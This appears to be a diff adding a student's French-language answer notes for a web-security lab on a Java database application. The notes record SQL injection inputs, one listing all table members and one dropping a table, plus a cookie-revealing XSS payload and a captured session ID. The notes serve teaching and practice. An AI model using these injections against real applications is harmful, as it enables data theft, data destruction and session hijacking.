@@ -1,0 +1,12 @@
+I)
+	Q1 : grep Connection *.java
+	Q2 : sed -i.old -e s/localhost/psqlserv/ -e s/template1/n3p1/ -e s/mathieu/delecaum/ *.java
+
+3) a faire au moment de connexion
+	Q1: avec ' OR'1'='1 -> dans afficher info on voit tous les membres de la table
+	Q4: paul'; drop table bidon; --
+	    -> ne pas oublier de mettre le reste en commentaire
+
+5)
+	<script>alert(document.cookie)</script> permet d'afficher le JSESSIONID quand on lance voir info
+	JSESSIONID=04C90D6923757776607BBD45AAACE8C5
